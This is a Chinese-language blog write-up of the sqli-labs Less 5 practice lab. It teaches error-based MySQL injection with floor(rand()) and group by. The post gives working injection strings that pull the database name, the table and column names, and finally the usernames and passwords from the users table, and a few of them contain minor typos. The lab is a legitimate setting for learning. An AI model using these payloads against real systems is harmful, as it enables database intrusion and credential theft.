---
layout: post
title:  "我的SQL（2）"
desc: "新手上路"
keywords: "sql"
date: 2016-11-19
categories: [work]
tags: [blog]
icon: fa-bookmark-o
---

# Writeup（基于sqli-labs的less 5）
首先注入

>### `?id=1`

`You are in……`我一脸懵逼，十万脸懵逼。what？不显示。不信邪的我继续尝试`id=2` `id=3`还是一样。看了下源码，fwrite都没有，就是说，他什么都不会显示。简直让人害怕不已。嗯~要换点方法。

在网上搜了一下，哦？！需要构造 一种语法正确（在编译时是正确的）而运行时会出错的sql查询语句，并且错误信息中包含数据局相关信息。一些天才的研究人员发现，可以使用聚合函数 group by子句，并结合随机函数rand()，在运行过程中有可能出错。哈哈哈心动了，开干。（下面附上sql的一些随机语句）



1. ### `select rand()`          	  		    0~1 之间的随机值

----------

2. ### `select rang()*2` 	     	  	 	    0~2 之间的随机值
	
----------

3. ### `select floor(rand()*2)`     		    0 1 两个整数随机出现
 
----------

4. ### `select database()` 	        	    当前数据库
 
----------

5. ### `select concat((select database()),0x20,floor(rand()   *2))a` 	                       			{当前数据库}{空格}{0 1中的一个}


开干开干哈哈哈哈哈。

>### `?id=0' select 1,count(*),concat((select database()),0x20,floor(rand()*2))a from information_schema.tables group by a%23`
>（注释：count(*)表示全部字段，count(字段名)表示该字段。a是别名，是用来group by的别名。这个随意填写方便就好。0x20是空格的16制码。其他的都能看懂的啦哈哈哈）

第一次`You are in……`别担心，没随机到而已。刷新几遍哈哈出来了。`Duplicate entry 'security 1' for key ''` ok!数据库名出来了。就可以运用前面less1-4的语句来获取信息啦。首先

>### `?id=0' select 1,count(*),concat((select group_concat(distinct table_name) from information_schema.tables where table_schema='security'),0x20,floor(rand()*2))a from information_schema.tables group by a%23`
>（注释：`group_concat(distinct table_name)`这个是显示security里的所有字段。和less1-4有点区别。不过都可以吧只是一个快一个要慢慢地用limit来偏移而已。）

啦啦啦获得users。继续继续

>### `?id=0' union select 1,count(*),concat((select group_concat(distinct column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x20,floor(rand()*2))a from information_schema.tables group by a%23`

得到字段id，username，password。
继续下一步。

>### `?id=0' union select 1,count(*),concat((select concat_ws(char(32,58,32),id,username,password) from users limit 0,1),0x20,floor(rand()*2))a from information_schema.tables group by a%23`

Flag取到。走人。哈哈哈哈哈。

# 总结

### 这里与以往的不一样。展现的是一个更为普遍的事例。因为通常没有人那么傻去把信息显示出来。所以很多时候就需要用到这个随机方法。技能已get。待下次的研究学习。